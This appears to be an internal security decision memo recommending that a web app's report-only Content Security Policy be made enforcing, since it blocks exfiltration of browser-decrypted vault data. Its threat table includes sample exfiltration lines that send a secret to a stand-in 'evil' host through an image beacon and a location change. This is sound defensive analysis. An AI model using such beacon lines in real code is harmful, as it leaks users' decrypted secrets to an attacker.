# D9 — the CSP decision

**For Steve. Decision, not work.** Register entry:
`PROJECT.yaml → deferred → the-csp-report-sink-expires-before-anyone-reads-it`.

## The finding, restated precisely

`next.config.mjs` ships two CSP headers:

- **Enforcing:** `base-uri` · `object-src` · `frame-ancestors` · `form-action` — the four that
  cannot blank a page.
- **Report-only:** the full policy, including `default-src`, `connect-src`, `img-src`, `style-src`,
  and `script-src 'self' 'unsafe-inline' 'unsafe-eval'`, reporting to `/api/csp-report`.

The report-only header exists to execute a stated plan: *"observe real traffic, remove what nothing
needs, then take the middleware decision on evidence."*

**That plan cannot execute.** `/api/csp-report` writes to stderr and nothing else. Vercel runtime log
retention measured **~24 hours** on 2026-08-20 (a 7-day query and a 24-hour query returned identical
counts), and `/api/csp-report` did not appear among the 29 distinct request paths in the retained
window. There is no sink, so there is no evidence, so the decision it was meant to inform can never
arrive. Meanwhile the header costs bytes on every response.

⚠️ Read "no reports observed" as **"we cannot see"**, not "no violations". One day of mostly-synthetic
traffic proves nothing either way.

## Where I disagree with the original reasoning

The config's own note says enforcing while `'unsafe-inline'` and `'unsafe-eval'` remain "would buy
very little." **For this product specifically, I think that substantially undersells it**, and it is
the crux of the recommendation.

The threat that matters here is not "can a script run." It is: **an injected script reads decrypted
vault plaintext out of page memory and sends it somewhere.** This product decrypts in the browser,
so exfiltration is the whole game.

`'unsafe-inline'` concedes the first half — a script can run. Enforcing the rest closes the second:

| channel | enforced policy | result |
|---|---|---|
| `fetch` / XHR / WebSocket / `sendBeacon` to attacker host | `connect-src 'self' …` | **blocked** |
| image beacon — `new Image().src = 'https://evil/?d=' + secret` | `img-src 'self' data: blob:` | **blocked** |
| form POST to attacker host | `form-action 'self'` | already enforced |
| loading further attacker script | `default-src 'self'` | **blocked** |
| `location = 'https://evil/?d=' + secret` | — | **still possible** |

So enforcing today converts *silent, invisible, background* exfiltration into *an attacker must
visibly navigate the victim away*. That is not marginal. It is most of the practical protection, and
it arrives without touching middleware.

## What it would cost — measured, not assumed

I checked what enforcing would actually break:

- **Client `fetch()` to an absolute external URL: none.** Zero occurrences in `src/` or `lib/`.
- **Third-party scripts or embeds: none.** No `next/script`, no analytics tag, no Intercom, no
  Hotjar, no `<script src>` to another origin.
- **Stripe** is a redirect, not an embed — already noted in the config, and confirmed: `billing.stripe.com`
  appears only as a navigation target.
- `@vercel/analytics` is declared; it posts to `/_vercel/insights/*`, which is **same-origin** and
  covered by `connect-src 'self'`.

The risk of promoting the existing report-only policy to enforcing is therefore close to zero,
because the app already behaves as if the policy were on.

## The options

**A — Promote the current policy to enforcing. (Recommended.)**
One-line change: the report-only header's value becomes the enforcing header's value. Buys the whole
exfiltration table above. Near-zero risk per the measurements. Does **not** solve the nonce question,
and does not pretend to.

**B — Persist the reports, then decide later.**
Write CSP reports to a table, run for a real window, then take the nonce/middleware decision on
evidence. Rigorous, and it is what the original plan intended — but it delays *all* protection while
the evidence accumulates, and the evidence it gathers is only about the `script-src` question, not
about anything in the table above.

**C — Do both. (What I would actually do.)**
Promote the current policy to enforcing **now**, and ship a *new* report-only header for the next
rung — the same policy minus `'unsafe-inline'`/`'unsafe-eval'` — with a sink that outlives a day.
Then you are protected today, and you are gathering the evidence for the one decision that genuinely
needs it. Two changes instead of one, and the report-only header finally reports something useful.

**D — Remove the report-only header.**
Honest about the fact that it informs nothing, and stops paying for it. Only sensible if you also
take A; on its own it is a step backwards.

## What is not an option

**Leaving it exactly as it is.** That is the decorative state: a guard that is declared, costs
something on every response, and is connected to nothing that would fail if violated. It reads as
protection in exactly the review that should notice its absence.

## If you pick C, the sink question

Cheapest durable sink that fits this repo: a table, written by `/api/csp-report`, with the same
fail-open posture the route already has (a reporting endpoint must never become a way to break the
page). ⚠️ Rate-limit it and cap the row size — a public unauthenticated write endpoint that anyone
can POST to is exactly the shape `route-auth.ts` exists to police, and CSP reports arrive from real
browsers with no credential by design.
